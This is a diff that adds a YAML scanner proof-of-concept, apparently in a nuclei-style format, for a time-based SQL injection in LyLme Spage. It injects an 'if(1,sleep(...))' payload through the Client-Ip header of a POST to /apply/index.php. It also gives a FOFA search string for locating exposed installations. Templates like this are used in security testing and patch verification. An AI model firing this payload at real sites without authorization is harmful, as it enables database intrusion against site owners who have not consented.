@@ -1,0 +1,22 @@
+id: poc-yaml-lylme-spage-sqli
+info:
+  name: LyLme Spage SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: LyLme Spage
+  fofa: title="上网导航 - LyLme Spage"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 1
+  t3: random_str(10)
+requests:
+- method: POST
+  path: /apply/index.php?submit=post
+  headers:
+    Client-Ip: 0'>if(1,sleep({{.t1}}),2)>'
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: url=http://{{.t3}}.com&name=test&group_id=1&icon=&authcode=
+  expression: status_code == 200 && contains(body,"\"code\"\x3a \"200\", \"msg\"\x3a
+    \"请等待管理员审核\"") && duration >= t1 && duration < t2
+transport: http
